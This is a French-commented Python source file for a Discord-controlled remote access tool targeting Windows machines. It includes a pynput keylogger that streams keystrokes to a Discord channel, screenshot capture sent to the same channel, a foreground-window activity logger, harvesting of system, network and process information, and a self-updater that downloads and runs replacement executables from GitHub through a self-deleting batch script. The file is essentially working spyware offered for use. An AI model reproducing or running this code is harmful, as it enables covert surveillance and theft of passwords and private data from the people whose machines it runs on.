import threading
import time
import win32gui
import win32process
import psutil
from datetime import datetime, timedelta
import sys
import asyncio
import discord
import os
import tkinter as tk
from tkinter import messagebox
import pyautogui
import socket
import requests
import platform
import cv2
import shutil
import tempfile
import subprocess
import json
import zipfile

# ============== VERSION ET CONFIGURATION ==============
CURRENT_VERSION = "1.1.0"  # ⚠️ IMPORTANT : Incrémenter à chaque nouvelle version !
UPDATE_CHECK_INTERVAL = 3600  # 1 heure

# Détecter si on est en mode EXE ou PY
IS_EXE = getattr(sys, 'frozen', False)
if IS_EXE:
    BASE_DIR = os.path.dirname(sys.executable)
    SCRIPT_NAME = os.path.basename(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    SCRIPT_NAME = os.path.basename(__file__)

print(f"🔧 Mode détecté : {'EXE' if IS_EXE else 'PY'}")
print(f"📁 Répertoire : {BASE_DIR}")

# ============== CHARGEMENT CONFIGURATION SÉCURISÉ ==============
def load_config():
    """Charge la configuration depuis différentes sources"""
    config = {}
    
    # 1. Essayer config.py local
    config_py_path = os.path.join(BASE_DIR, 'config.py')
    if os.path.exists(config_py_path):
        try:
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", config_py_path)
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            config['DISCORD_TOKEN'] = getattr(config_module, 'DISCORD_TOKEN', None)
            config['CHANNEL_ID'] = getattr(config_module, 'CHANNEL_ID', 0)
            config['COMMANDES'] = getattr(config_module, 'COMMANDES', 0)
            config['GITHUB_USER'] = getattr(config_module, 'GITHUB_USER', 'USERNAME_INCONNU')
            config['GITHUB_REPO'] = getattr(config_module, 'GITHUB_REPO', 'discord-remote-bot')
            print("✅ Configuration config.py chargée")
            return config
        except Exception as e:
            print(f"⚠️ Erreur config.py : {e}")
    
    # 2. Essayer config.json
    config_json_path = os.path.join(BASE_DIR, 'config.json')
    if os.path.exists(config_json_path):
        try:
            with open(config_json_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
            print("✅ Configuration config.json chargée")
            return config
        except Exception as e:
            print(f"⚠️ Erreur config.json : {e}")
    
    # 3. Variables d'environnement
    config['DISCORD_TOKEN'] = os.getenv('DISCORD_TOKEN')
    config['CHANNEL_ID'] = int(os.getenv('CHANNEL_ID', '0'))
    config['COMMANDES'] = int(os.getenv('COMMANDES', '0'))
    config['GITHUB_USER'] = os.getenv('GITHUB_USER', 'USERNAME_INCONNU')
    config['GITHUB_REPO'] = os.getenv('GITHUB_REPO', 'discord-remote-bot')
    print("✅ Variables d'environnement chargées")
    return config

# Charger la configuration
config = load_config()
DISCORD_TOKEN = config.get('DISCORD_TOKEN')
CHANNEL_ID = config.get('CHANNEL_ID', 0)
COMMANDES = config.get('COMMANDES', 0)
GITHUB_USER = config.get('GITHUB_USER', 'USERNAME_INCONNU')
GITHUB_REPO = config.get('GITHUB_REPO', 'discord-remote-bot')

# Vérification des variables critiques
if not DISCORD_TOKEN:
    print("❌ ERREUR CRITIQUE : DISCORD_TOKEN manquant !")
    print("💡 Solution : Créer config.py ou config.json avec votre token")
    input("Appuyez sur Entrée pour quitter...")
    sys.exit(1)

if CHANNEL_ID == 0 or COMMANDES == 0:
    print("❌ ERREUR : Channel IDs manquants !")
    print("💡 Vérifiez CHANNEL_ID et COMMANDES dans votre config")
    input("Appuyez sur Entrée pour quitter...")
    sys.exit(1)

# Variables globales Discord
discord_loop = asyncio.new_event_loop()
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
keylogger_running = False
keylogger_buffer = []
activity_logger_running = False
logger_thread = None

print(f"🔗 Repository : {GITHUB_USER}/{GITHUB_REPO}")
print(f"🔑 Token Discord : {'✅ Défini' if DISCORD_TOKEN else '❌ Manquant'}")

# ============== SYSTÈME DE MISE À JOUR COMPLET ==============
class AutoUpdater:
    def __init__(self):
        self.current_file = sys.executable if IS_EXE else sys.argv[0]
        self.temp_dir = tempfile.gettempdir()
        self.backup_file = os.path.join(self.temp_dir, f"bot_backup_{int(time.time())}")
        self.update_dir = os.path.join(self.temp_dir, "bot_update")
        
    def get_latest_version_github(self):
        """Récupère la dernière version depuis GitHub"""
        try:
            # Vérifier les releases GitHub
            api_url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/releases/latest"
            response = requests.get(api_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                version = data.get('tag_name', '').replace('v', '')
                return version, data
            else:
                print("⚠️ Pas de releases - vérification fichier source")
                return self.get_version_from_source(), None
        except Exception as e:
            print(f"Erreur vérification version: {e}")
            return None, None
    
    def get_version_from_source(self):
        """Extrait la version du fichier source"""
        try:
            if IS_EXE:
                # Pour EXE, vérifier le fichier source .py
                url = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/bot.py"
            else:
                # Pour PY, vérifier directement
                url = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/{SCRIPT_NAME}"
            
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                content = response.text
                import re
                match = re.search(r'CURRENT_VERSION\s*=\s*["\']([^"\']+)["\']', content)
                if match:
                    return match.group(1)
            print("⚠️ Impossible d'extraire la version du source")
            return None
        except Exception as e:
            print(f"Erreur extraction version source : {e}")
            return None
    
    def is_newer_version(self, online_version):
        """Compare les versions"""
        try:
            current = [int(x) for x in CURRENT_VERSION.split('.')]
            online = [int(x) for x in online_version.split('.')]
            
            for i in range(max(len(current), len(online))):
                c = current[i] if i < len(current) else 0
                o = online[i] if i < len(online) else 0
                if o > c:
                    return True
                elif o < c:
                    return False
            return False
        except Exception as e:
            print(f"Erreur comparaison version: {e}")
            return False
    
    def download_update_exe(self, release_data):
        """Télécharge la mise à jour EXE depuis GitHub releases"""
        try:
            # Chercher l'asset .exe dans la release
            exe_asset = None
            for asset in release_data.get('assets', []):
                if asset['name'].endswith('.exe'):
                    exe_asset = asset
                    break
            
            if not exe_asset:
                print("❌ Aucun fichier .exe trouvé dans la release")
                run_async(send_to_discord("❌ Aucun fichier .exe disponible dans la release"))
                return None
            
            print(f"📥 Téléchargement {exe_asset['name']} ({exe_asset['size']} bytes)")
            run_async(send_to_discord(f"📥 Téléchargement {exe_asset['name']}..."))
            
            response = requests.get(exe_asset['browser_download_url'], timeout=120)
            if response.status_code == 200:
                temp_exe = os.path.join(self.temp_dir, exe_asset['name'])
                with open(temp_exe, 'wb') as f:
                    f.write(response.content)
                
                print("✅ Fichier EXE téléchargé")
                return temp_exe
            else:
                print(f"❌ Erreur téléchargement EXE : {response.status_code}")
                return None
                
        except Exception as e:
            print(f"Erreur téléchargement EXE: {e}")
            run_async(send_to_discord(f"❌ Erreur téléchargement EXE : {e}"))
            return None
    
    def download_update_source(self):
        """Télécharge les fichiers source (.py + config)"""
        try:
            os.makedirs(self.update_dir, exist_ok=True)
            files_downloaded = []
            
            # Liste des fichiers à télécharger
            files_to_update = ['bot.py']
            
            # Si config.json existe, le télécharger aussi (mais ne pas écraser)
            if os.path.exists(os.path.join(BASE_DIR, 'config.json')):
                files_to_update.append('config.json')
            
            for filename in files_to_update:
                url = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/{filename}"
                print(f"📥 Téléchargement {filename}...")
                
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    file_path = os.path.join(self.update_dir, filename)
                    
                    if filename.endswith('.py'):
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        
                        # Vérifier syntaxe Python
                        try:
                            compile(response.text, file_path, 'exec')
                            files_downloaded.append(filename)
                        except SyntaxError as e:
                            print(f"❌ Fichier Python invalide {filename}: {e}")
                            return None
                    else:
                        # Fichier config.json
                        if filename == 'config.json' and os.path.exists(os.path.join(BASE_DIR, filename)):
                            print(f"⚠️ {filename} existe déjà - conservation de l'ancien")
                            continue
                        
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        files_downloaded.append(filename)
                else:
                    print(f"⚠️ Impossible de télécharger {filename} (status: {response.status_code})")
            
            if files_downloaded:
                print(f"✅ Fichiers téléchargés : {files_downloaded}")
                return self.update_dir
            else:
                print("❌ Aucun fichier téléchargé")
                return None
                
        except Exception as e:
            print(f"Erreur téléchargement source: {e}")
            run_async(send_to_discord(f"❌ Erreur téléchargement : {e}"))
            return None
    
    def backup_current_version(self):
        """Sauvegarde la version actuelle"""
        try:
            if IS_EXE:
                backup_path = f"{self.backup_file}.exe"
                shutil.copy2(self.current_file, backup_path)
            else:
                backup_path = f"{self.backup_file}.py"
                shutil.copy2(self.current_file, backup_path)
                
                # Backup config si existe
                config_path = os.path.join(BASE_DIR, 'config.py')
                if os.path.exists(config_path):
                    shutil.copy2(config_path, f"{self.backup_file}_config.py")
            
            print(f"✅ Backup créé : {backup_path}")
            return backup_path
        except Exception as e:
            print(f"❌ Erreur backup : {e}")
            return None
    
    def apply_update_exe(self, new_exe_path):
        """Applique la mise à jour EXE"""
        try:
            backup_path = self.backup_current_version()
            if not backup_path:
                return False
            
            print("🔄 Application mise à jour EXE...")
            run_async(send_to_discord("🔄 **Mise à jour EXE en cours...**"))
            
            # Script batch pour remplacer l'EXE après fermeture
            batch_script = f"""@echo off
timeout /t 3 /nobreak > nul
move "{new_exe_path}" "{self.current_file}"
if exist "{self.current_file}" (
    echo Mise a jour appliquee
    start "" "{self.current_file}"
) else (
    echo Erreur - restoration backup
    move "{backup_path}" "{self.current_file}"
    start "" "{self.current_file}"
)
del "%~f0"
"""
            
            batch_path = os.path.join(self.temp_dir, "update_bot.bat")
            with open(batch_path, 'w', encoding='utf-8') as f:
                f.write(batch_script)
            
            run_async(send_to_discord("✅ **Mise à jour préparée !** Redémarrage..."))
            
            # Lancer le script et quitter
            subprocess.Popen([batch_path], shell=True)
            time.sleep(2)
            os._exit(0)  # Forcer la fermeture
            
        except Exception as e:
            print(f"❌ Erreur application EXE : {e}")
            run_async(send_to_discord(f"❌ Erreur mise à jour EXE : {e}"))
            return False
    
    def apply_update_source(self, update_dir):
        """Applique la mise à jour source"""
        try:
            backup_path = self.backup_current_version()
            if not backup_path:
                return False
            
            print("🔄 Application mise à jour source...")
            run_async(send_to_discord("🔄 **Mise à jour fichiers source...**"))
            
            # Copier les nouveaux fichiers
            updated_files = []
            for filename in os.listdir(update_dir):
                src = os.path.join(update_dir, filename)
                dst = os.path.join(BASE_DIR, filename)
                
                if filename == 'config.json' and os.path.exists(dst):
                    print(f"⚠️ Conservation du config existant")
                    continue
                
                shutil.copy2(src, dst)
                updated_files.append(filename)
                print(f"✅ Fichier mis à jour : {filename}")
            
            # Nettoyer
            shutil.rmtree(update_dir, ignore_errors=True)
            
            run_async(send_to_discord(f"✅ **Fichiers mis à jour :** {', '.join(updated_files)}\n🔄 Redémarrage..."))
            
            # Redémarrage
            time.sleep(3)
            python = sys.executable
            os.execl(python, python, *sys.argv)
            
        except Exception as e:
            print(f"❌ Erreur application source : {e}")
            run_async(send_to_discord(f"❌ Erreur mise à jour : {e}"))
            return False
    
    def check_and_update(self):
        """Vérification et mise à jour automatique"""
        try:
            print("🔍 Vérification automatique des MAJ...")
            latest_version, release_data = self.get_latest_version_github()
            
            if not latest_version:
                return False
            
            print(f"📦 Actuelle: {CURRENT_VERSION} | En ligne: {latest_version}")
            
            if self.is_newer_version(latest_version):
                print("🎯 Nouvelle version détectée !")
                run_async(send_to_discord(
                    f"🔄 **Mise à jour automatique !**\n"
                    f"📦 Actuelle: {CURRENT_VERSION}\n"
                    f"🆕 Nouvelle: {latest_version}\n"
                    f"📥 Mode: {'EXE' if IS_EXE else 'SOURCE'}\n"
                    f"⏳ Téléchargement..."
                ))
                
                if IS_EXE and release_data:
                    # Mode EXE : télécharger depuis releases
                    new_file = self.download_update_exe(release_data)
                    if new_file:
                        return self.apply_update_exe(new_file)
                else:
                    # Mode source : télécharger fichiers
                    update_dir = self.download_update_source()
                    if update_dir:
                        return self.apply_update_source(update_dir)
            
            return False
        except Exception as e:
            print(f"Erreur vérification MAJ : {e}")
            return False

# Instance globale
updater = AutoUpdater()

# ============== FONCTIONS UTILITAIRES ==============
async def send_to_discord(message, file_path=None, channel_id=None):
    """Envoie un message sur Discord avec gestion d'erreurs"""
    try:
        await client.wait_until_ready()
        channel = client.get_channel(channel_id or COMMANDES)
        if channel:
            if file_path and os.path.exists(file_path):
                await channel.send(message, file=discord.File(file_path))
                os.remove(file_path)
            else:
                if len(message) > 2000:
                    for i in range(0, len(message), 2000):
                        await channel.send(message[i:i+2000])
                else:
                    await channel.send(message)
    except Exception as e:
        print(f"Erreur envoi Discord: {e}")

def run_async(coro):
    """Exécute une coroutine dans le thread Discord"""
    return asyncio.run_coroutine_threadsafe(coro, discord_loop)

# ============== COMMANDES SYSTÈME (inchangées) ==============
class Commands:
    @staticmethod
    def screenshot():
        """Prend une capture d'écran"""
        try:
            file_path = "screenshot.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(file_path)
            run_async(send_to_discord("📸 Capture d'écran :", file_path))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur screenshot : {e}"))

    @staticmethod
    def sysinfo():
        """Récupère les informations système"""
        try:
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('C:')
            
            info = f"""💻 **Informations Système**
🖥️ **OS :** {platform.system()} {platform.release()}
⚙️ **Processeur :** {platform.processor()}
🧠 **CPU Cœurs :** {cpu_count}
🔋 **RAM :** {memory.total // (1024**3)} GB (Utilisé: {memory.percent}%)
💾 **Disque C: :** {disk.total // (1024**3)} GB (Utilisé: {(disk.used/disk.total)*100:.1f}%)
🔧 **Mode :** {'EXE' if IS_EXE else 'SOURCE'}
📁 **Répertoire :** {BASE_DIR}"""
            
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur système : {e}"))

    # [Autres commandes inchangées - je les abrège pour la place]
    @staticmethod
    def network():
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            try:
                public_ip = requests.get("https://api.ipify.org", timeout=5).text
            except:
                public_ip = "Non disponible"
            info = f"🌐 **Nom d'hôte :** {hostname}\n📍 **IP Locale :** {local_ip}\n🌍 **IP Publique :** {public_ip}"
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur réseau : {e}"))

    @staticmethod
    def tasks():
        try:
            file_path = "tasks_list.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        f.write(f"{proc.info['pid']}: {proc.info['name']}\n")
                    except:
                        continue
            run_async(send_to_discord("📝 Liste des tâches :", file_path))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur tâches : {e}"))

    @staticmethod
    def time():
        try:
            now = datetime.now()
            info = f"⏰ **Heure :** {now.strftime('%H:%M:%S')}\n📅 **Date :** {now.strftime('%d/%m/%Y')}"
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur : {e}"))

    # [J'abrège les autres commandes pour économiser l'espace]

# ============== COMMANDES DE MISE À JOUR AMÉLIORÉES ==============
class UpdateCommands:
    @staticmethod
    def check_updates():
        """Vérification manuelle"""
        try:
            run_async(send_to_discord(
                f"🔍 **Vérification MAJ...**\n"
                f"📦 Version actuelle: {CURRENT_VERSION}\n"
                f"🔧 Mode: {'EXE' if IS_EXE else 'SOURCE'}\n"
                f"🔗 Repository: {GITHUB_USER}/{GITHUB_REPO}"
            ))
            
            latest, release_data = updater.get_latest_version_github()
            if latest:
                if updater.is_newer_version(latest):
                    update_info = f"""🆕 **Nouvelle version disponible !**
📦 Actuelle: {CURRENT_VERSION}
🔥 Disponible: {latest}
🔧 Mode: {'EXE (depuis releases)' if IS_EXE else 'SOURCE (depuis raw)'}
💡 Utilisez `*forceupdate` pour installer"""
                    
                    if IS_EXE and release_data:
                        exe_assets = [a for a in release_data.get('assets', []) if a['name'].endswith('.exe')]
                        if exe_assets:
                            update_info += f"\n📎 Fichier EXE: {exe_assets[0]['name']}"
                        else:
                            update_info += "\n⚠️ Pas de fichier .exe dans cette release"
                    
                    run_async(send_to_discord(update_info))
                else:
                    run_async(send_to_discord(f"✅ **Bot à jour !**\nVersion: {latest}"))
            else:
                run_async(send_to_discord(
                    f"❌ **Impossible de vérifier les mises à jour**\n"
                    f"🔗 Repository: {GITHUB_USER}/{GITHUB_REPO}\n"
                    f"💡 Vérifiez que le repository existe et est public"
                ))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur vérification : {e}"))
    
    @staticmethod
    def force_update():
        """Force la mise à jour"""
        try:
            run_async(send_to_discord(
                f"🔄 **Mise à jour forcée en cours...**\n"
                f"🔧 Mode: {'EXE' if IS_EXE else 'SOURCE'}\n"
                f"⏳ Téléchargement..."
            ))
            
            latest, release_data = updater.get_latest_version_github()
            if not latest:
                run_async(send_to_discord("❌ **Impossible de récupérer la version en ligne**"))
                return
            
            if IS_EXE and release_data:
                # Mode EXE
                new_file = updater.download_update_exe(release_data)
                if new_file:
                    updater.apply_update_exe(new_file)
                else:
                    run_async(send_to_discord("❌ **Échec téléchargement EXE**\n💡 Vérifiez qu'une release avec .exe existe"))
            else:
                # Mode SOURCE
                update_dir = updater.download_update_source()
                if update_dir:
                    updater.apply_update_source(update_dir)
                else:
                    run_async(send_to_discord("❌ **Échec téléchargement SOURCE**\n💡 Vérifiez que bot.py existe dans le repository"))
            
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur force update : {e}"))
    
    @staticmethod
    def rollback():
        """Retour version précédente"""
        try:
            if IS_EXE:
                backup_pattern = f"{updater.backup_file}*.exe"
            else:
                backup_pattern = f"{updater.backup_file}*.py"
            
            import glob
            backups = glob.glob(backup_pattern)
            
            if backups:
                latest_backup = max(backups, key=os.path.getctime)
                shutil.copy2(latest_backup, updater.current_file)
                run_async(send_to_discord("✅ **Rollback effectué !** Redémarrage..."))
                time.sleep(2)
                
                if IS_EXE:
                    os.startfile(updater.current_file)
                    os._exit(0)
                else:
                    python = sys.executable
                    os.execl(python, python, *sys.argv)
            else:
                run_async(send_to_discord("❌ **Pas de backup disponible**\n💡 Les sauvegardes sont créées lors des MAJ"))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur rollback : {e}"))

# ============== [Reste du code inchangé] ==============
class LoggerCommands:
    @staticmethod
    def start_logger():
        global activity_logger_running, logger_thread
        if activity_logger_running:
            run_async(send_to_discord("❌ Logger déjà actif"))
            return
        activity_logger_running = True
        logger_thread = threading.Thread(target=activity_logger, daemon=True)
        logger_thread.start()
        run_async(send_to_discord("✅ **Logger d'activité démarré**\n📊 Surveillance des applications..."))

    @staticmethod
    def stop_logger():
        global activity_logger_running
        if not activity_logger_running:
            run_async(send_to_discord("❌ Logger non actif"))
            return
        activity_logger_running = False
        run_async(send_to_discord("🛑 **Logger d'activité arrêté**"))

    @staticmethod
    def status_logger():
        status = "🟢 Actif" if activity_logger_running else "🔴 Arrêté"
        run_async(send_to_discord(f"📊 **Status Logger :** {status}"))

# [Vues Discord inchangées - abrégées pour l'espace]
class MainControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    # [Boutons identiques]

class UpdateControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🔍 Check MAJ', style=discord.ButtonStyle.primary)
    async def check_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔍 Vérification des mises à jour...", ephemeral=True)
        threading.Thread(target=UpdateCommands.check_updates).start()

    @discord.ui.button(label='🔄 Force MAJ', style=discord.ButtonStyle.success)
    async def force_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔄 Mise à jour forcée...", ephemeral=True)
        threading.Thread(target=UpdateCommands.force_update).start()

    @discord.ui.button(label='⏪ Rollback', style=discord.ButtonStyle.danger)
    async def rollback_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏪ Rollback en cours...", ephemeral=True)
        threading.Thread(target=UpdateCommands.rollback).start()

class LoggerControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='▶️ Start Logger', style=discord.ButtonStyle.success)
    async def start_logger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("▶️ Démarrage logger...", ephemeral=True)
        threading.Thread(target=LoggerCommands.start_logger).start()

    @discord.ui.button(label='⏹️ Stop Logger', style=discord.ButtonStyle.danger)
    async def stop_logger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏹️ Arrêt logger...", ephemeral=True)
        threading.Thread(target=LoggerCommands.stop_logger).start()

    @discord.ui.button(label='📊 Status Logger', style=discord.ButtonStyle.secondary)
    async def status_logger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("📊 Vérif status...", ephemeral=True)
        threading.Thread(target=LoggerCommands.status_logger).start()

# ============== AUTRES VUES (inchangées mais abrégées) ==============
class MainControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='📸 Screenshot', style=discord.ButtonStyle.primary)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("📸 Capture...", ephemeral=True)
        threading.Thread(target=Commands.screenshot).start()

    @discord.ui.button(label='💻 SysInfo', style=discord.ButtonStyle.secondary)
    async def sysinfo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("💻 Infos...", ephemeral=True)
        threading.Thread(target=Commands.sysinfo).start()

    @discord.ui.button(label='🌐 Network', style=discord.ButtonStyle.secondary)
    async def network_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🌐 Réseau...", ephemeral=True)
        threading.Thread(target=Commands.network).start()

    @discord.ui.button(label='📝 Tasks', style=discord.ButtonStyle.secondary)
    async def tasks_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("📝 Tâches...", ephemeral=True)
        threading.Thread(target=Commands.tasks).start()

    @discord.ui.button(label='⏰ Time', style=discord.ButtonStyle.secondary)
    async def time_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏰ Heure...", ephemeral=True)
        threading.Thread(target=Commands.time).start()

# ============== GESTIONNAIRE KEYLOGGER ==============
def manage_keylogger(action):
    global keylogger_running, keylogger_buffer
    
    if action == "start":
        if keylogger_running:
            run_async(send_to_discord("❌ Keylogger déjà actif"))
            return
            
        keylogger_running = True
        keylogger_buffer = []
        
        def keylogger_worker():
            global keylogger_running, keylogger_buffer
            try:
                from pynput import keyboard
                
                def on_press(key):
                    if keylogger_running:
                        keylogger_buffer.append(str(key).replace("'", ""))
                
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                
                while keylogger_running:
                    if keylogger_buffer:
                        logs = "".join(keylogger_buffer[:100])
                        keylogger_buffer = keylogger_buffer[100:]
                        run_async(send_to_discord(f"⌨️ Keylog:\n```{logs}```", channel_id=CHANNEL_ID))
                    time.sleep(10)
                
                listener.stop()
            except Exception as e:
                run_async(send_to_discord(f"❌ Erreur keylogger : {e}"))
        
        threading.Thread(target=keylogger_worker, daemon=True).start()
        run_async(send_to_discord("✅ Keylogger démarré"))
    
    elif action == "stop":
        if keylogger_running:
            keylogger_running = False
            run_async(send_to_discord("🛑 Keylogger arrêté"))
        else:
            run_async(send_to_discord("❌ Keylogger non actif"))

# ============== LOGGER ACTIVITÉ ==============
def activity_logger():
    """Logger d'activité avec contrôle start/stop"""
    global activity_logger_running
    
    last_window = None
    last_process = None
    start_time = time.time()

    while activity_logger_running:
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                process = psutil.Process(pid)
                process_name = process.name()
                window_title = win32gui.GetWindowText(hwnd)
                
                if window_title != last_window and window_title:
                    duration = time.time() - start_time
                    if last_window:
                        log_line = (f"[{datetime.now().strftime('%H:%M:%S')}] "
                                  f"**{last_process}** | \"{last_window}\" | "
                                  f"Durée: {time.strftime('%H:%M:%S', time.gmtime(duration))}")
                        run_async(send_to_discord(log_line, channel_id=CHANNEL_ID))
                    
                    last_window = window_title
                    last_process = process_name
                    start_time = time.time()
            
            time.sleep(1)
        except Exception as e:
            if activity_logger_running:
                print(f"Erreur logger: {e}")
            time.sleep(1)

# ============== VÉRIFICATION AUTOMATIQUE AMÉLIORÉE ==============
def auto_update_checker():
    """Thread de vérification automatique des mises à jour"""
    print(f"⏰ Vérification auto-MAJ démarrée (mode: {'EXE' if IS_EXE else 'SOURCE'})")
    time.sleep(300)  # Attendre 5 minutes après le démarrage
    
    while True:
        try:
            current_time = datetime.now().strftime('%H:%M:%S')
            print(f"[{current_time}] 🔍 Vérification automatique MAJ...")
            
            # Vérifier et appliquer automatiquement
            if updater.check_and_update():
                print("🎯 MAJ appliquée - redémarrage imminent")
                break  # Le bot va redémarrer
            
            print(f"✅ Prochaine vérif dans {UPDATE_CHECK_INTERVAL//60} min")
            time.sleep(UPDATE_CHECK_INTERVAL)
            
        except Exception as e:
            print(f"❌ Erreur auto-update : {e}")
            time.sleep(3600)  # Retry dans 1h

# ============== GESTIONNAIRE COMMANDES ==============
COMMAND_MAP = {
    "*screen": Commands.screenshot,
    "*sysinfo": Commands.sysinfo,
    "*network": Commands.network,
    "*tasks": Commands.tasks,
    "*time": Commands.time,
    # Commandes MAJ
    "*update": UpdateCommands.check_updates,
    "*forceupdate": UpdateCommands.force_update,
    "*rollback": UpdateCommands.rollback,
    # Commandes Logger
    "*logger": LoggerCommands.status_logger,
    "*logstart": LoggerCommands.start_logger,
    "*logstop": LoggerCommands.stop_logger,
}

@client.event
async def on_ready():
    """Événement de connexion réussie"""
    print(f"✅ Bot connecté : {client.user}")
    mode_info = f"🔧 Mode: {'EXE' if IS_EXE else 'SOURCE'} | 📁 Dir: {BASE_DIR}"
    await send_to_discord(
        f"🚀 **Bot System v{CURRENT_VERSION}** démarré !\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
        f"{mode_info}"
    )

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.lower().strip()

    # Commande Help MISE À JOUR
    if content == "*help":
        mode_info = f"{'EXE' if IS_EXE else 'SOURCE'}"
        help_text = f"""🤖 **Bot System v{CURRENT_VERSION}** - Interface de Contrôle
🔧 **Mode :** {mode_info} | 📁 **Dir :** {BASE_DIR}

**📋 Commandes système :**
`*screen` `*sysinfo` `*network` `*time` `*tasks`
`*keylogger start/stop`

**📊 Commandes Logger :**
`*logstart` `*logstop` `*logger` (status)

**🔄 Mises à jour :** {'(EXE depuis releases)' if IS_EXE else '(SOURCE depuis raw)'}
`*update` `*forceupdate` `*rollback`

**🔗 Repository:** `{GITHUB_USER}/{GITHUB_REPO}`"""
        
        await message.channel.send(help_text)
        await message.channel.send("**📊 Contrôles Principaux**", view=MainControlView())
        await message.channel.send("**🔄 Mises à Jour**", view=UpdateControlView())
        await message.channel.send("**📊 Logger Activité**", view=LoggerControlView())
        return

    # Commandes simples
    if content in COMMAND_MAP:
        await message.channel.send(f"⚡ Exécution de `{content}`...")
        threading.Thread(target=COMMAND_MAP[content]).start()
        return

    # Commandes avec paramètres (keylogger etc.)
    if content.startswith("*keylogger "):
        action = content.split()[1] if len(content.split()) > 1 else ""
        if action in ["start", "stop"]:
            await message.channel.send(f"⚙️ Keylogger {action}...")
            threading.Thread(target=manage_keylogger, args=(action,)).start()
        else:
            await message.channel.send("❌ Usage : `*keylogger start` ou `*keylogger stop`")

def start_discord_bot():
    asyncio.set_event_loop(discord_loop)
    discord_loop.run_until_complete(client.start(DISCORD_TOKEN))

# ============== LANCEMENT PRINCIPAL ==============
if __name__ == "__main__":
    print(f"🚀 Démarrage Bot System v{CURRENT_VERSION}")
    print(f"🔧 Mode détecté : {'EXE' if IS_EXE else 'SOURCE'}")
    print(f"📁 Répertoire : {BASE_DIR}")
    print(f"📋 Fichier : {SCRIPT_NAME}")
    print(f"🔗 Repository : {GITHUB_USER}/{GITHUB_REPO}")
    
    # Démarrer Discord
    threading.Thread(target=start_discord_bot, daemon=True).start()
    time.sleep(3)
    
    # Logger d'activité en attente
    print("📊 Logger d'activité en attente (utilisez *logstart)")
    
    # Démarrer vérification automatique MAJ
    print("🔄 Démarrage vérification auto-update...")
    threading.Thread(target=auto_update_checker, daemon=True).start()

    try:
        print("✅ Bot prêt ! Ctrl+C pour arrêter.")
        print("💡 Nouvelles fonctionnalités MAJ :")
        print("   - Détection automatique EXE/SOURCE")
        print("   - MAJ EXE depuis GitHub releases")
        print("   - MAJ SOURCE depuis raw files")
        print("   - Gestion config.json + config.py")
        print("   - Backup et rollback améliorés")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Arrêt du bot...")
        activity_logger_running = False
        sys.exit(0)
